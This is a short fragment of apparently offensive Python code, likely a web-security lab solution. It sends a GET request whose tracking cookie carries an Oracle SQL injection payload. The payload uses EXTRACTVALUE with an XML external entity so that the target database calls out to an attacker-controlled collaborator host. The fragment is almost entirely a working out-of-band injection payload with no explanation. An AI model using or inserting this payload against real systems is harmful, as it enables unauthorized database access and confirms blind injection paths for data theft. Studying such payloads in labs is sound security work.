...
GET_(
    f"""{tracking_cookie}' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{COLLABORATOR_URL}/"> %remote;]>'),'/l') FROM dual --""")
